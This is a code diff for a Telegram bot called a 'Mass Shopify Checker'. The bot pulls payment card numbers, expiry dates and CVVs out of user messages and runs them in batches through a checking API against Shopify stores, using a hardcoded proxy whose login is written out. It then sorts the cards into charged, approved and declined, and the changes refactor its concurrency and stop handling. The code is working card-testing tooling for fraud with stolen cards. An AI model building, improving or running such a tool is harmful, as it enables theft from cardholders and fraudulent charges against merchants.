@@ -5815,8 +5815,8 @@ import time
 import re
 import io
 import logging
-import uuid
 from typing import List, Dict
+
 from telegram import (
     Update,
     InlineKeyboardMarkup,
@@ -5843,16 +5843,18 @@ CARD_REGEX = re.compile(r"\d{12,19}\|\d{2}\|\d{2,4}\|\d{3,4}")
 # Proxy placeholder
 DEFAULT_PROXY = "142.147.128.93:6593:fvbysspi:bsbh3trstb1c"
 
-# Error & keyword patterns
-ERROR_PATTERNS = ["CLINTE TOKEN", "DEL AMMOUNT EMPTY", "PRODUCT ID IS EMPTY", "R4 TOKEN EMPTY", "TAX AMOUNT EMPTY"]
+# Junk/error response patterns
+ERROR_PATTERNS = [
+    "CLINTE TOKEN", "DEL AMMOUNT EMPTY",
+    "PRODUCT ID IS EMPTY", "R4 TOKEN EMPTY",
+    "TAX AMOUNT EMPTY"
+]
+
+# Classification keyword groups
 CHARGED_KEYWORDS = {"THANK YOU", "ORDER_PLACED", "APPROVED", "SUCCESS", "CHARGED"}
 APPROVED_KEYWORDS = {"3D_AUTHENTICATION", "INCORRECT_CVC", "INCORRECT_ZIP", "INSUFFICIENT_FUNDS"}
-DECLINED_KEYWORDS = {"INVALID_PAYMENT_ERROR", "DECLINED", "CARD_DECLINED", "INCORRECT_NUMBER", "FRAUD_SUSPECTED", "EXPIRED_CARD", "EXPIRE_CARD"}
-
-# --- Global concurrency control ---
-MAX_CONCURRENCY = 10   # total max parallel requests allowed
-semaphore = asyncio.Semaphore(MAX_CONCURRENCY)
-
+DECLINED_KEYWORDS = {"INVALID_PAYMENT_ERROR", "DECLINED", "CARD_DECLINED", "INCORRECT_NUMBER",
+                     "FRAUD_SUSPECTED", "EXPIRED_CARD", "EXPIRE_CARD"}
 
 # ---------- Utility ----------
 def extract_cards_from_text(text: str) -> List[str]:
@@ -5878,7 +5880,8 @@ async def consume_credit(user_id: int) -> bool:
     return False
 
 
-def build_msp_buttons(approved: int, charged: int, declined: int, owner_and_run: str) -> InlineKeyboardMarkup:
+def build_msp_buttons(approved: int, charged: int, declined: int, owner_id: int) -> InlineKeyboardMarkup:
+    """Removed the Current button; only show stats + Stop."""
     return InlineKeyboardMarkup([
         [
             InlineKeyboardButton(f"✅ Approved: {approved}", callback_data="noop"),
@@ -5886,39 +5889,30 @@ def build_msp_buttons(approved: int, charged: int, declined: int, owner_and_run:
         ],
         [
             InlineKeyboardButton(f"❌ Declined: {declined}", callback_data="noop"),
-            InlineKeyboardButton("⏹ Stop", callback_data=f"stop:{owner_and_run}")
+            InlineKeyboardButton("⏹ Stop", callback_data=f"stop:{owner_id}")
         ]
     ])
 
 
 # ---------- Networking ----------
-async def check_card_on_site(session: httpx.AsyncClient, base_url: str, site: str, card: str, proxy: str) -> Dict[str, str]:
-    async with semaphore:  # limit concurrency
-        if not site.startswith("http://") and not site.startswith("https://"):
-            site = "https://" + site
-        url = f"{base_url}?site={site}&cc={card}&proxy={proxy}"
-
-        for attempt in range(2):  # retry once
-            try:
-                r = await session.get(url, timeout=30)
-                try:
-                    data = r.json()
-                except Exception:
-                    if r.text.strip():
-                        return {"response": r.text, "status": "false", "price": "0", "gateway": "N/A"}
-                    continue
-                return {
-                    "response": str(data.get("Response", "Unknown")),
-                    "status": str(data.get("Status", "false")),
-                    "price": str(data.get("Price", "0")),
-                    "gateway": str(data.get("Gateway", "N/A")),
-                }
-            except Exception as e:
-                if attempt == 0:
-                    await asyncio.sleep(1)  # short backoff
-                    continue
-                return {"response": f"Error: {str(e)}", "status": "false", "price": "0", "gateway": "N/A"}
-        return {"response": "Unknown", "status": "false", "price": "0", "gateway": "N/A"}
+async def check_card(session: httpx.AsyncClient, base_url: str, site: str, card: str, proxy: str) -> Dict[str, str]:
+    if not site.startswith("http://") and not site.startswith("https://"):
+        site = "https://" + site
+    url = f"{base_url}?site={site}&cc={card}&proxy={proxy}"
+    try:
+        r = await session.get(url, timeout=55)
+        try:
+            data = r.json()
+        except Exception:
+            return {"response": r.text or "Unknown", "status": "false", "price": "0", "gateway": "N/A"}
+        return {
+            "response": str(data.get("Response", "Unknown")),
+            "status": str(data.get("Status", "false")),
+            "price": str(data.get("Price", "0")),
+            "gateway": str(data.get("Gateway", "N/A")),
+        }
+    except Exception as e:
+        return {"response": f"Error: {str(e)}", "status": "false", "price": "0", "gateway": "N/A"}
 
 
 # ---------- Buttons ----------
@@ -5927,35 +5921,31 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
     if not query:
         return
     data = query.data or ""
+
     if data.startswith("stop:"):
         try:
-            owner_id, run_id = data.split(":")[1:]
-            owner_id = int(owner_id)
+            owner_id = int(data.split(":", 1)[1])
         except Exception:
-            return
+            owner_id = None
+
         if query.from_user.id != owner_id:
             await query.answer("⚠️ Not your request!", show_alert=True)
             return
 
-        context.user_data.setdefault("msp_stop_flags", {})[run_id] = True
+        # Stop only this user's process
+        context.user_data["msp_stop"] = True
         await query.answer("⏹ Stopped! Sending results...", show_alert=True)
 
-        state = context.user_data.get(f"msp_state_{run_id}")
-        if state:
+        if "msp_state" in context.user_data:
+            state = context.user_data["msp_state"]
             await finalize_results(
-                update,
-                state["msg"],
-                state["cards"],
-                state["approved"],
-                state["charged"],
-                state["declined"],
-                state["errors"],
-                state["approved_results"],
-                state["charged_results"],
-                state["declined_results"],
-                state["error_results"]
+                update, state["msg"], state["cards"],
+                state["approved"], state["charged"], state["declined"], state["errors"],
+                state["approved_results"], state["charged_results"],
+                state["declined_results"], state["error_results"]
             )
         return
+
     await query.answer()
 
 
@@ -5971,8 +5961,8 @@ async def finalize_results(update: Update, msg, cards, approved, charged, declin
         sections.append("❌ DECLINED\n" + "\n\n".join(declined_results))
     if error_results:
         sections.append("⚠️ ERRORS\n" + "\n\n".join(error_results))
-    final_report = "\n\n============================\n\n".join(sections) if sections else "No results collected."
 
+    final_report = "\n\n============================\n\n".join(sections) if sections else "No results collected."
     file_buf = io.BytesIO(final_report.encode("utf-8"))
     file_buf.name = "shopify_results.txt"
 
@@ -6000,16 +5990,15 @@ async def finalize_results(update: Update, msg, cards, approved, charged, declin
         pass
 
 
-async def run_msp(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: List[str], base_url: str, sites: List[str], msg, run_id: str) -> None:
-    stop_flags = context.user_data.setdefault("msp_stop_flags", {})
-    stop_flags[run_id] = False
-
+async def run_msp(update: Update, context: ContextTypes.DEFAULT_TYPE,
+                  cards: List[str], base_url: str, sites: List[str], msg) -> None:
+    context.user_data["msp_stop"] = False
     approved = declined = errors = charged = checked = 0
     approved_results, charged_results, declined_results, error_results = [], [], [], []
     proxy = DEFAULT_PROXY
-    BATCH_SIZE = 5
+    BATCH_SIZE = 3   # process 3 cards in parallel
 
-    context.user_data[f"msp_state_{run_id}"] = {
+    context.user_data["msp_state"] = {
         "msg": msg,
         "cards": cards,
         "approved": approved,
@@ -6024,56 +6013,74 @@ async def run_msp(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: Lis
 
     async with httpx.AsyncClient() as session:
         for i in range(0, len(cards), BATCH_SIZE):
-            if stop_flags.get(run_id):
+            if context.user_data.get("msp_stop"):
                 return
+
             batch = cards[i:i + BATCH_SIZE]
 
-            # each card checks all sites in parallel
-            results = await asyncio.gather(
-                *(asyncio.gather(*(check_card_on_site(session, base_url, site, card, proxy) for site in sites), return_exceptions=True) for card in batch)
-            )
+            async def process_card(card: str):
+                nonlocal approved, declined, errors, charged, checked
+                if context.user_data.get("msp_stop"):
+                    return None
 
-            for card, site_responses in zip(batch, results):
-                if stop_flags.get(run_id):
-                    return
-                best_resp = None
+                resp = None
                 best_score = 0
-                for resp in site_responses:
-                    if isinstance(resp, Exception):
+                resp_upper = ""
+
+                for site in sites:
+                    r = await check_card(session, base_url, site, card, proxy)
+                    resp_text = (r.get("response") or "").strip()
+                    resp_upper = resp_text.upper()
+
+                    if any(pat in resp_upper for pat in ERROR_PATTERNS):
                         continue
-                    resp_upper = (resp.get("response") or "").upper()
-                    if any(p in resp_upper for p in ERROR_PATTERNS):
-                        continue
-                    score = 0
-                    if "INSUFFICIENT_FUNDS" in resp_upper or any(k in resp_upper for k in CHARGED_KEYWORDS):
-                        score = 4
+                    if any(k in resp_upper for k in CHARGED_KEYWORDS):
+                        best_score = 4
                     elif any(k in resp_upper for k in APPROVED_KEYWORDS):
-                        score = 3
+                        best_score = 3
                     elif any(k in resp_upper for k in DECLINED_KEYWORDS):
-                        score = 2
+                        best_score = 2
                     elif "ERROR" in resp_upper or "UNKNOWN" in resp_upper:
-                        score = 1
-                    if score > best_score:
-                        best_score = score
-                        best_resp = resp
-                if not best_resp:
-                    best_resp = {"response": "Unknown", "price": "0", "gateway": "N/A"}
+                        best_score = 1
+                    else:
+                        best_score = 0
 
-                resp_upper = (best_resp.get("response") or "").upper()
-                line_resp = f"Response: {best_resp.get('response','Unknown')}\n Price: {best_resp.get('price','0')}\n Gateway: {best_resp.get('gateway','N/A')}"
+                    resp = r
+                    break
 
-                if "INSUFFICIENT_FUNDS" in resp_upper or any(k in resp_upper for k in CHARGED_KEYWORDS):
-                    charged += 1; charged_results.append(f"🔥 {card}\n {line_resp}")
-                elif any(k in resp_upper for k in APPROVED_KEYWORDS):
-                    approved += 1; approved_results.append(f"✅ {card}\n {line_resp}")
-                elif any(k in resp_upper for k in DECLINED_KEYWORDS):
-                    declined += 1; declined_results.append(f"❌ {card}\n {line_resp}")
+                if resp is None:
+                    resp = r
+                    best_score = 0
+
+                line_resp = (
+                    f"Response: {resp.get('response','Unknown')}\n"
+                    f" Price: {resp.get('price','0')}\n"
+                    f" Gateway: {resp.get('gateway','N/A')}"
+                )
+
+                if "INSUFFICIENT_FUNDS" in resp_upper:
+                    charged += 1
+                    charged_results.append(f"🔥 {card}\n {line_resp}")
+                elif best_score == 3:
+                    approved += 1
+                    approved_results.append(f"✅ {card}\n {line_resp}")
+                elif best_score == 2:
+                    declined += 1
+                    declined_results.append(f"❌ {card}\n {line_resp}")
+                elif best_score == 4:
+                    charged += 1
+                    charged_results.append(f"🔥 {card}\n {line_resp}")
                 else:
-                    errors += 1; error_results.append(f"⚠️ {card}\n {line_resp}")
+                    errors += 1
+                    error_results.append(f"⚠️ {card}\n {line_resp}")
+
                 checked += 1
 
-            # update state
-            context.user_data[f"msp_state_{run_id}"].update({
+            # Run 3 cards in parallel
+            await asyncio.gather(*(process_card(c) for c in batch))
+
+            # update state after each batch
+            context.user_data["msp_state"].update({
                 "approved": approved,
                 "charged": charged,
                 "declined": declined,
@@ -6084,8 +6091,9 @@ async def run_msp(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: Lis
                 "error_results": error_results
             })
 
+            # Progress update
             try:
-                buttons = build_msp_buttons(approved, charged, declined, f"{update.effective_user.id}:{run_id}")
+                buttons = build_msp_buttons(approved, charged, declined, update.effective_user.id)
                 summary_text = (
                     f"📊 𝙈𝙖𝙨𝙨 𝙎𝙝𝙤𝙥𝙞𝙛𝙮 𝘾𝙝𝙚𝙘𝙠𝙚𝙧\n"
                     f"━━━━━━━━━━━━━━━━━━━━━━━\n"
@@ -6099,7 +6107,8 @@ async def run_msp(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: Lis
                     "</code></pre>"
                     f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                 )
-                await msg.edit_text(summary_text, parse_mode="HTML", reply_markup=buttons)
+                await msg.edit_text(summary_text, parse_mode="HTML",
+                                     disable_web_page_preview=True, reply_markup=buttons)
             except Exception as e:
                 logger.warning(f"Edit failed: {e}")
 
@@ -6141,7 +6150,6 @@ async def msp(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     if not user_data:
         await update.message.reply_text("❌ No user data found in DB.")
         return
-
     if not await consume_credit(user_id):
         await update.message.reply_text("❌ You have no credits left.")
         return
@@ -6151,8 +6159,6 @@ async def msp(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     if not sites:
         await update.message.reply_text("❌ No sites found in your account.")
         return
-
-    run_id = str(uuid.uuid4())[:8]
 
     initial_summary = (
         f"📊 𝙈𝙖𝙨𝙨 𝙎𝙝𝙤𝙥𝙞𝙛𝙮 𝘾𝙝𝙚𝙘𝙠𝙚𝙧\n"
@@ -6167,17 +6173,12 @@ async def msp(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         "</code></pre>"
         f"━━━━━━━━━━━━━━━━━━━━━━━\n"
     )
-    buttons = build_msp_buttons(0, 0, 0, f"{update.effective_user.id}:{run_id}")
-    msg = await update.message.reply_text(initial_summary, parse_mode="HTML", reply_markup=buttons)
+    buttons = build_msp_buttons(0, 0, 0, update.effective_user.id)
+    msg = await update.message.reply_text(initial_summary, parse_mode="HTML",
+                                          disable_web_page_preview=True, reply_markup=buttons)
 
-    task = asyncio.create_task(run_msp(update, context, cards, base_url, sites, msg, run_id))
+    task = asyncio.create_task(run_msp(update, context, cards, base_url, sites, msg))
     task.add_done_callback(lambda t: logger.error(f"/msp crashed: {t.exception()}") if t.exception() else None)
-
-
-
-
-
-
 
 
 
